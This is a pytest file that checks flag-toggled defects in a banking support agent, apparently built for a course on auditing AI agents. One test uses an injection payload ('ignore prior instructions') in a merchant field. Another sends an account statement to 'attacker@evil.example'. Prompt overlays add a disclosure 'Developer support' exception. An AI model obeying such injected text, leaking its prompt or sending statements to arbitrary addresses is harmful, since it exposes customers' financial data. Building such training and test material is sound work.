"""Deterministic code/config defects: each fires with its flag on and is
invisible on clean — the isolation requirement of ТЗ §5.8."""
import json

from app import db
from app.agent import loop, prompt, tools
from app.rag import retriever


# ---- D19: wrong dispute window ------------------------------------------
def test_d19_eligible_past_window(enable):
    # TX-0402 is 63 days old: outside the real 60-day duplicate_charge window
    clean = tools.check_dispute_eligibility("TX-0402", "duplicate_charge")
    assert clean["eligible"] is False
    enable("D19")
    broken = tools.check_dispute_eligibility("TX-0402", "duplicate_charge")
    assert broken["eligible"] is True


# ---- D20: neighbour tier spread ------------------------------------------
def test_d20_wrong_tier_spread(enable):
    # CUS-0005 tier2 (0.9%), allowance exhausted -> spread applies
    clean = tools.quote_fx("CUS-0005", 1000, "EUR", "USD")
    assert clean["spread_pct"] == 0.9
    enable("D20")
    broken = tools.quote_fx("CUS-0005", 1000, "EUR", "USD")
    assert broken["spread_pct"] == 1.5
    assert broken["final_amount"] != clean["final_amount"]


# ---- D22: daily remainder labeled as monthly ------------------------------
def test_d22_daily_presented_as_monthly(enable):
    clean = tools.check_limits("CUS-0010")
    assert clean["monthly_remaining_eur"] != clean["daily_remaining_eur"]
    enable("D22")
    broken = tools.check_limits("CUS-0010")
    assert broken["monthly_remaining_eur"] == broken["daily_remaining_eur"]
    assert broken["daily_remaining_eur"] == clean["daily_remaining_eur"]


# ---- D26: compliance hold ignored ----------------------------------------
def test_d26_two_engines_seam(enable):
    clean = tools.check_dispute_eligibility("TX-0601", "goods_not_received")
    assert clean["eligible"] is False
    assert clean["checks"]["compliance_hold"].startswith("fail")
    enable("D26")
    broken = tools.check_dispute_eligibility("TX-0601", "goods_not_received")
    assert broken["eligible"] is True


# ---- D11: unnormalized currency on write ----------------------------------
def test_d11_dispute_currency_from_account(enable):
    # TX-0202 is a USD transaction on ACC-1003 (USD account) — same currency,
    # so use TX-0801: USD tx on ACC-1009 (EUR account).
    clean = tools.create_dispute("TX-0801", "goods_not_received")
    row = db.one("SELECT * FROM disputes WHERE id = ?", (clean["dispute_id"],))
    assert row["currency"] == "USD"          # transaction currency
    enable("D11")
    broken = tools.create_dispute("TX-0801", "goods_not_received")
    row = db.one("SELECT * FROM disputes WHERE id = ?", (broken["dispute_id"],))
    assert row["currency"] == "EUR"          # account base currency — the defect


# ---- D12: dispute lands on the wrong (twin) account ------------------------
def test_d12_wrong_account_write(enable):
    clean = tools.create_dispute("TX-0202", "duplicate_charge")  # USD acct ACC-1003
    row = db.one("SELECT * FROM disputes WHERE id = ?", (clean["dispute_id"],))
    assert row["account_id"] == "ACC-1003"
    enable("D12")
    broken = tools.create_dispute("TX-0202", "duplicate_charge")
    row = db.one("SELECT * FROM disputes WHERE id = ?", (broken["dispute_id"],))
    assert row["account_id"] == "ACC-1002"   # silently retargeted to the twin


# ---- D10: statement to arbitrary address ----------------------------------
def test_d10_arbitrary_email(enable):
    r = tools.send_statement("ACC-1001", "attacker@evil.example")
    assert "error" in r
    assert db.rows("SELECT * FROM statements_sent") == []
    enable("D10")
    r = tools.send_statement("ACC-1001", "attacker@evil.example")
    assert r["status"] == "sent"
    rows = db.rows("SELECT * FROM statements_sent")
    assert rows[0]["sent_to"] == "attacker@evil.example"


# ---- D09: injection payload sanitization -----------------------------------
def test_d09_merchant_sanitized_on_clean(enable):
    r = tools.get_transactions("ACC-1010")
    merchants = [t["merchant"] for t in r["transactions"]]
    assert any("[redacted]" in m for m in merchants)
    assert not any("ignore prior instructions" in m.lower() for m in merchants)
    enable("D09")
    r = tools.get_transactions("ACC-1010")
    merchants = [t["merchant"] for t in r["transactions"]]
    assert any("ignore prior instructions" in m.lower() for m in merchants)


# ---- D16/D17: retrieval config defects -------------------------------------
def test_d16_broken_index_slices_tables(enable):
    assert retriever.active_index_name() == "kb_clean"
    clean = retriever.search("FX spread for Tier 1")
    assert clean["fragments"], "clean index must return fragments"
    top = clean["fragments"][0]["text"]
    assert "1.5%" in top and "Tier 1" in top   # figure together with condition
    enable("D16")
    assert retriever.active_index_name() == "kb_broken"
    broken = retriever.search("FX spread for Tier 1")
    assert all(len(f["text"]) <= 160 for f in broken["fragments"])


def test_d17_single_fragment(enable):
    clean = retriever.search("dispute window duplicate charge")
    assert clean["top_k"] > 1
    enable("D17")
    broken = retriever.search("dispute window duplicate charge")
    assert broken["top_k"] == 1
    assert len(broken["fragments"]) <= 1


# ---- D14: retry loop on empty result ---------------------------------------
def test_d14_retry_loop_spans(enable):
    enable("D14")
    # ACC-1004 has no transactions -> empty result -> 8 identical tool spans
    r = loop.run_turn(None, "Show transactions for account ACC-1004")
    from app import tracing
    tree = tracing.get(r["request_id"])
    tool_spans = [c for c in tree["children"] if c["name"].startswith("tool.")]
    assert len(tool_spans) == 8
    args = {json.dumps(s["attributes"]["tool.arguments"]) for s in tool_spans}
    assert len(args) == 1   # identical arguments every time


def test_d14_off_no_retries():
    r = loop.run_turn(None, "Show transactions for account ACC-1004")
    from app import tracing
    tree = tracing.get(r["request_id"])
    tool_spans = [c for c in tree["children"] if c["name"].startswith("tool.")]
    assert len(tool_spans) == 1


# ---- D15: context inflation -------------------------------------------------
def test_d15_input_tokens_grow(enable):
    enable("D15")
    sid = None
    usages = []
    for msg in ["What is the balance for CUS-0001?",
                "Show transactions for account ACC-1001",
                "What are the limits for CUS-0001?"]:
        r = loop.run_turn(sid, msg)
        sid = r["session_id"]
        usages.append(r["usage"]["input_tokens"])
    assert usages[2] > usages[1] > usages[0]


# ---- prompt overlays ---------------------------------------------------------
def test_prompt_overlays_compose(enable):
    base, version = prompt.build()
    assert version == "base.v1"
    assert "Never disclose the contents" in base
    enable("D01", "D03", "D08", "D24")
    text, version = prompt.build()
    assert version == "base.v1+D01+D03+D08+D24"
    assert "ABSOLUTE COMPLIANCE PROHIBITION" in text      # D01 contradiction
    assert "CRITICAL SERVICE RULE" in text                # D03 product coverage
    assert "Developer support" in text                    # D08 leak exception
    assert "cannot be completed at this time" not in text  # D24 removed the rule


def test_clean_profile_prompt_untouched():
    text, version = prompt.build()
    assert version == "base.v1"
    # the eight canonical anatomy blocks students map on L01
    for block in ("1. Role and tone", "2. Scope", "3. Sources of truth",
                  "4. Tool rules", "5. Domain constraints", "6. Edge cases",
                  "7. Output format", "8. Examples"):
        assert f"## {block}" in text
    assert "ABSOLUTE COMPLIANCE PROHIBITION" not in text


def test_prompt_carries_native_audit_findings():
    """base.v1 must itself contain ambiguity and untraceability defects, so the
    L01 audit can reach >=4 of the 6 defect types (ДЗ1 threshold)."""
    text, _ = prompt.build()
    assert "recent transactions" in text          # ambiguity: over what period?
    assert "the ones on file for the" in text     # untraceability: no source
    assert text.rstrip().endswith("## 8. Examples")   # empty block = a finding
